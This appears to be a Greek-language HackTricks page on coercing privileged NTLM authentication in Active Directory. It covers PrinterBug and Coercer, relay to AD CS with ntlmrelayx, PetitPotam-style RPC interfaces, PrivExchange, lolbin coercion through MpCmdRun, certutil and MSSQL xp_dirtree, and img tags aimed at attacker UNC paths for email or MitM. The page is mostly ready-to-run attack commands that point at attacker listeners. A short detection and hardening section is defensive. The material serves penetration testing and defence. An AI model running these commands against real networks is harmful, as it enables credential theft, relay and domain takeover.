# Εξαναγκασμός Προνομιούχου NTLM Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

Το [**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) είναι μια **collection** από **remote authentication triggers**, γραμμένη σε C# με χρήση του MIDL compiler, ώστε να αποφεύγονται dependencies τρίτων.

## Abuse του Spooler Service

Εάν το _**Print Spooler**_ service είναι **enabled,** μπορείτε να χρησιμοποιήσετε κάποια ήδη γνωστά AD credentials για να **request** από τον print server του Domain Controller μια **update** σχετικά με νέες print jobs και απλώς να του υποδείξετε να **send the notification to some system**.\
Σημειώστε ότι όταν ο printer στέλνει τη notification σε arbitrary systems, πρέπει να **authenticate against** αυτό το **system**. Επομένως, ένας attacker μπορεί να κάνει το _**Print Spooler**_ service να κάνει authentication against ένα arbitrary system, και το service θα **use the computer account** σε αυτή την authentication.

Under the hood, το κλασικό **PrinterBug** primitive κάνει abuse το **`RpcRemoteFindFirstPrinterChangeNotificationEx`** μέσω του **`\\PIPE\\spoolss`**. Ο attacker αρχικά ανοίγει ένα printer/server handle και στη συνέχεια παρέχει ένα fake client name στο `pszLocalMachine`, ώστε ο target spooler να δημιουργήσει ένα notification channel **back to the attacker-controlled host**. Αυτός είναι ο λόγος για τον οποίο το αποτέλεσμα είναι **outbound authentication coercion** και όχι άμεση εκτέλεση κώδικα.<sup>[[2]](#references)</sup>\
Εάν αναζητάτε **RCE/LPE** στο ίδιο το spooler, ελέγξτε το [PrintNightmare](printnightmare.md). Αυτή η σελίδα επικεντρώνεται σε **coercion and relay**.

### Εύρεση Windows Servers στο domain

Χρησιμοποιήστε PowerShell για να παραθέσετε τα Windows hosts. Οι servers είναι συνήθως οι στόχοι υψηλότερης προτεραιότητας, επομένως επικεντρωθείτε πρώτα σε αυτούς:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
Select-Object -ExpandProperty DNSHostName > servers.txt
```
### Εντοπισμός υπηρεσιών Spooler που ακούν

Χρησιμοποιώντας μια ελαφρώς τροποποιημένη έκδοση του [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) του @mysmartlogin (Vincent Le Toux), ελέγξτε αν η υπηρεσία Spooler ακούει:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Μπορείτε επίσης να χρησιμοποιήσετε το `rpcdump.py` σε Linux και να αναζητήσετε το πρωτόκολλο **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Ή δοκιμάστε γρήγορα hosts από Linux με **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Αν θέλετε να **καταγράψετε τις coercion surfaces** αντί να ελέγξετε απλώς αν υπάρχει το spooler endpoint, χρησιμοποιήστε το **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Αυτό είναι χρήσιμο, επειδή η εμφάνιση του endpoint στο EPM σάς ενημερώνει μόνο ότι το print RPC interface είναι καταχωρισμένο. **Δεν** εγγυάται ότι κάθε coercion method είναι προσβάσιμη με τα τρέχοντα privileges σας ή ότι ο host θα δημιουργήσει ένα αξιοποιήσιμο authentication flow.

### Ζητήστε από την υπηρεσία να πραγματοποιήσει authentication σε έναν αυθαίρετο host

Μπορείτε να κάνετε compile το [SpoolSample από το αρχικό repository](https://github.com/leechristensen/SpoolSample).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ή χρησιμοποιήστε το [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ή το [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) αν χρησιμοποιείτε Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Με το **Coercer**, μπορείτε να στοχεύσετε απευθείας τις διεπαφές του spooler και να αποφύγετε να μαντεύετε ποια μέθοδος RPC εκτίθεται:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Callbacks μέσω RPC-over-TCP

Μην θεωρείτε ότι μια επιτυχής κλήση `RpcRemoteFindFirstPrinterChangeNotificationEx` πρέπει απαραίτητα να δημιουργεί traffic στο TCP/445. **Τα Windows 11 22H2 και νεότερα χρησιμοποιούν από προεπιλογή RPC over TCP για τις επικοινωνίες εκτύπωσης**· το RPC over named pipes είναι απενεργοποιημένο, εκτός αν το επαναφέρει κάποια policy ή η ρύθμιση `RpcUseNamedPipeProtocol=1`. Επομένως, παλιοί listeners που υποστηρίζουν μόνο SMB μπορεί να αναφέρουν ότι το trigger στάλθηκε, χωρίς ποτέ να λάβουν το callback. Η Microsoft τεκμηριώνει το TCP/135 (Endpoint Mapper) και δυναμικά RPC ports για το κανονικό print RPC, ενώ οι οργανισμοί μπορούν να περιορίσουν αυτό το range ή να επιλέξουν ένα σταθερό print RPC port.<sup>[[10]](#references)</sup>

Το τρέχον **Impacket `ntlmrelayx.py`** περιλαμβάνει RPC relay server και ένα μικρό Endpoint Mapper, ενεργοποιημένα από προεπιλογή στο TCP/135. Αυτή η υποστήριξη συγχωνεύτηκε τον Ιούνιο του 2025 ειδικά με ένα αποδεδειγμένο PrinterBug-to-AD-CS chain, επιτρέποντας την relaying του authenticated RPC callback, ακόμη και όταν το victim δεν κάνει fallback σε SMB/WebDAV.<sup>[[11]](#references)</sup>

Η υποστήριξη RPC relay/EPM περιλαμβάνεται στο **Impacket 0.13.0 και νεότερα**. Πριν από το debugging ενός listener που λείπει στο TCP/135, επαληθεύστε ότι δεν εκτελείται κάποιο παλαιότερο packaged `ntlmrelayx.py`· το help output θα πρέπει να εμφανίζει και τα δύο RPC-server switches.<sup>[[12]](#references)</sup>
```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
--adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```
Αναζητήστε τα `Setting up RPC Server on port 135` και `RPCD: Received connection` στην έξοδο του relay. Αν η RPC call επιστρέφει ένα αναμενόμενο error, αλλά τίποτα δεν φτάνει στον listener, ελέγξτε την print RPC transport policy του victim, το outbound filtering, το DNS resolution και αν κάποια άλλη process έχει ήδη στην κατοχή της το TCP/135. Βεβαιωθείτε επίσης ότι το `ntlmrelayx` δεν ξεκίνησε με `--no-rpc-server`.

### Εξαναγκασμός HTTP αντί για SMB με WebClient

Σε συστήματα που εξακολουθούν να χρησιμοποιούν **RPC over named pipes** (legacy builds ή συμπεριφορά που αποκαταστάθηκε μέσω policy), το κλασικό PrinterBug συνήθως προκαλεί ένα **SMB** authentication προς το `\\attacker\share`, το οποίο παραμένει χρήσιμο για **capture**, **relay σε HTTP targets** ή **relay όπου απουσιάζει το SMB signing**.\
Ωστόσο, το relaying **SMB σε SMB** συχνά μπλοκάρεται από το **SMB signing**, επομένως οι operators μπορεί να προτιμήσουν να εξαναγκάσουν authentication μέσω **HTTP/WebDAV**. Αυτό δεν αποτελεί fallback για τη συμπεριφορά RPC-over-TCP που περιγράφηκε παραπάνω.

Αν το target έχει ενεργή την υπηρεσία **WebClient**, ο listener μπορεί να καθοριστεί με μορφή που κάνει τα Windows να χρησιμοποιήσουν **WebDAV over HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν γίνεται chaining με **`ntlmrelayx --adcs`** ή άλλους HTTP relay targets, επειδή αποφεύγει την εξάρτηση από τη δυνατότητα SMB relay στη coerced σύνδεση. Η σημαντική προϋπόθεση είναι ότι το **WebClient πρέπει να εκτελείται** στο victim για να λειτουργήσει η παραλλαγή HTTP/WebDAV.

### Συνδυασμός με Unconstrained Delegation

Αν ένας attacker έχει παραβιάσει έναν υπολογιστή που έχει ρυθμιστεί για [Unconstrained Delegation](unconstrained-delegation.md), μπορεί να **εξαναγκάσει τον printer να πραγματοποιήσει authentication σε αυτόν τον υπολογιστή**. Το **TGT** του computer account του printer αποθηκεύεται στη συνέχεια στη μνήμη του host με unconstrained delegation, όπου ο attacker μπορεί να το ανακτήσει και να το επαναχρησιμοποιήσει με [Pass the Ticket](pass-the-ticket.md).

### Σημειώσεις για detection και hardening

Ο πιο αξιόπιστος τρόπος για την αφαίρεση του PrinterBug από ένα DC, PAW ή server που δεν εκτυπώνει είναι να σταματήσετε και να απενεργοποιήσετε το Spooler. Όπου απαιτείται εκτύπωση, ενισχύστε κάθε πιθανό relay destination (SMB server signing, LDAP signing/channel binding και EPA σε HTTP services όπως το AD CS), αντί να θεωρείτε ότι ο αποκλεισμός του TCP/445 στη διαδρομή callback είναι επαρκής.<sup>[[1]](#references)</sup>
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
Αν ο host εξακολουθεί να χρειάζεται **τοπική εκτύπωση**, ένας πιο περιορισμένος έλεγχος είναι το GPO `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`. Αυτό αποτρέπει τον spooler από το να δέχεται συνδέσεις απομακρυσμένων clients (και την κοινή χρήση εκτυπωτών), ενώ αφήνει την υπηρεσία διαθέσιμη τοπικά· κάντε επανεκκίνηση του spooler μετά την εφαρμογή του και, στη συνέχεια, επαναλάβετε τους ελέγχους προσβασιμότητας MS-RPRN παραπάνω.<sup>[[13]](#references)</sup>

Η ανίχνευση θα πρέπει να συσχετίζει μια authenticated κλήση προς το MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab`, ιδιαίτερα τα opnum 62/65 με μη τοπική τιμή callback, και μια άμεση εξερχόμενη σύνδεση SMB, HTTP ή RPC από τον host του spooler. Δημιουργήστε baseline για **interface UUID/opnum και ζεύγη source/destination**, όχι μόνο για πρόσβαση στο `\PIPE\spoolss`, επειδή τα σύγχρονα print stacks μπορούν να τοποθετούν το callback σε RPC-over-TCP.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Πίνακας RPC UNC-path coercion (interfaces/opnums που ενεργοποιούν εξερχόμενο authentication)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Σημειώσεις: asynchronous print interface στο ίδιο spooler pipe· χρησιμοποιήστε το Coercer για την απαρίθμηση προσβάσιμων μεθόδων σε έναν δεδομένο host<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (επίσης μέσω των \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums που συνήθως γίνονται abuse: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Σημείωση: Αυτές οι μέθοδοι δέχονται παραμέτρους που μπορούν να περιέχουν ένα UNC path (π.χ. `\\attacker\share`). Κατά την επεξεργασία τους, τα Windows θα κάνουν authentication (σε machine/user context) προς αυτό το UNC, επιτρέποντας τη σύλληψη ή το relay NetNTLM.\
Για abuse του spooler, το **MS-RPRN opnum 65** παραμένει το πιο συνηθισμένο και καλύτερα τεκμηριωμένο primitive, επειδή η specification του protocol αναφέρει ρητά ότι ο server δημιουργεί ένα notification channel πίσω προς τον client που καθορίζεται από το `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN μέσω \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: ο target προσπαθεί να ανοίξει το παρεχόμενο backup log path και κάνει authentication προς το UNC που ελέγχεται από τον attacker.<sup>[[1]](#references)</sup>
- Practical use: coercion Tier 0 assets (DC/RODC/Citrix/etc.) ώστε να εκπέμψουν NetNTLM και, στη συνέχεια, relay προς AD CS endpoints (σενάρια ESC8/ESC11) ή άλλες privileged services.<sup>[[1]](#references)</sup>

## PrivExchange

Η επίθεση `PrivExchange` είναι αποτέλεσμα ενός flaw που εντοπίστηκε στο **Exchange Server `PushSubscription` feature**. Αυτό το feature επιτρέπει σε οποιονδήποτε domain user με mailbox να εξαναγκάσει τον Exchange server να κάνει authentication σε οποιονδήποτε host που παρέχεται από τον client μέσω HTTP.

Από προεπιλογή, το **Exchange service εκτελείται ως SYSTEM** και διαθέτει υπερβολικά privileges (συγκεκριμένα, έχει **WriteDacl privileges στο domain πριν από το 2019 Cumulative Update**). Αυτό το flaw μπορεί να γίνει exploit για την ενεργοποίηση του **relaying πληροφοριών προς LDAP και, στη συνέχεια, την εξαγωγή της domain NTDS database**. Σε περιπτώσεις όπου το relay προς LDAP δεν είναι δυνατό, αυτό το flaw μπορεί ακόμη να χρησιμοποιηθεί για relay και authentication σε άλλους hosts εντός του domain. Η επιτυχής εκμετάλλευση αυτής της επίθεσης παρέχει άμεση πρόσβαση στον Domain Admin με οποιονδήποτε authenticated domain user account.

## Μέσα στα Windows

Αν βρίσκεστε ήδη μέσα στο Windows machine, μπορείτε να εξαναγκάσετε τα Windows να συνδεθούν σε έναν server χρησιμοποιώντας privileged accounts με:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ή χρησιμοποίησε αυτήν την άλλη τεχνική: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Είναι δυνατή η χρήση του lolbin certutil.exe (binary υπογεγραμμένο από τη Microsoft) για εξαναγκασμό NTLM authentication:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Μέσω email

Αν γνωρίζετε τη **διεύθυνση email** του χρήστη που συνδέεται σε ένα μηχάνημα το οποίο θέλετε να παραβιάσετε, θα μπορούσατε απλώς να του στείλετε ένα **email με μια εικόνα 1x1**, όπως η ακόλουθη
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Όταν το θύμα το ανοίξει, τα Windows επιχειρούν να πραγματοποιήσουν authentication.

### MitM

Αν μπορείτε να πραγματοποιήσετε μια επίθεση MitM και να εισαγάγετε HTML σε μια σελίδα που προβάλλεται από το θύμα, δοκιμάστε να εισαγάγετε μια εικόνα όπως:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Άλλοι τρόποι για force και phish NTLM authentication


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Αν μπορείτε να capture [NTLMv1 challenges, διαβάστε εδώ πώς να τα crack](../ntlm/index.html#ntlmv1-attack).\
_Να θυμάστε ότι, για να κάνετε crack το NTLMv1, πρέπει να ορίσετε το Responder challenge σε "1122334455667788"_



## References

- [1] [Unit 42 – Ο εξαναγκασμός authentication συνεχίζει να εξελίσσεται](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: Πρωτόκολλο απομακρυσμένης λειτουργίας EventLog](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Ενημερώσεις σύνδεσης RPC για εκτύπωση στα Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – RPC relay server και Endpoint Mapper για ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
- [12] [Fortra Impacket 0.13.0 – Έκδοση](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP: Επιτρέψτε στο Print Spooler να αποδέχεται συνδέσεις client](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
